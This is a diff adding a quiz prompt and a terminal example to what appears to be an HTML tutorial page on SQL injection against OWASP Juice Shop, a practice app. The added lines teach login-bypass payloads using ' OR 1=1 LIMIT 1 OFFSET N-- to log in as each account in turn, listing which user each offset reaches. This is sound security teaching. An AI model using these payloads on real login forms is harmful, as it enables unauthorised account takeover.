@@ -469,6 +469,28 @@ FROM users</code></pre></div>
             <text x="20" y="132" font-family="var(--font-mono)" font-size="12" fill="var(--color-warn)" font-weight="700">Net result: WHERE email='' OR 1=1   →   always true   →   all rows returned</text>
           </svg>
         </div>
+
+        <div class="prediction-prompt" style="margin-top:var(--space-4);">
+          <div class="prediction-prompt__question">🤔 <code>' OR 1=1--</code> returns every user in the table, and the backend always logs you into the first row (<code>admin@juice-sh.op</code>). What if you don't know anyone else's email address, and you want to log in as the <strong>2nd user</strong> or the <strong>3rd user</strong> in the table using SQL pagination?</div>
+          <div class="prediction-prompt__input-group">
+            <input type="text" class="prediction-prompt__input" placeholder="Your guess…" />
+            <button type="button" class="prediction-prompt__btn">Reveal</button>
+          </div>
+          <div class="prediction-prompt__reveal" hidden>
+            <span class="prediction-prompt__reveal-label">Answer</span>
+            <p style="margin:0;">Use <code>LIMIT 1 OFFSET N</code> before the comment! <code>' OR 1=1 LIMIT 1 OFFSET 1--</code> skips row 0 (admin) and hands the backend row 1 (<code>jim@juice-sh.op</code>). Increment <code>OFFSET 2</code>, <code>OFFSET 3</code>, and so on to walk through every account in the database one by one without knowing a single email address.</p>
+          </div>
+        </div>
+
+        <div class="terminal-window" style="margin-top:var(--space-3);">
+          <div class="terminal-window__header">
+            <span class="terminal-window__title">Walking through accounts with LIMIT &amp; OFFSET · try these in the Juice Shop Email field</span>
+          </div>
+          <div class="terminal-window__body"><pre><code>' OR 1=1 LIMIT 1 OFFSET 0--   // Row 0 → id=1: admin@juice-sh.op (admin)
+' OR 1=1 LIMIT 1 OFFSET 1--   // Row 1 → id=2: jim@juice-sh.op (customer)
+' OR 1=1 LIMIT 1 OFFSET 2--   // Row 2 → id=3: bender@juice-sh.op (customer)
+' OR 1=1 LIMIT 1 OFFSET 3--   // Row 3 → id=4: bjoern.kimminich@gmail.com (admin)</code></pre></div>
+        </div>
       </section>
 
       <!-- Section 4: Stretch, error-based -->
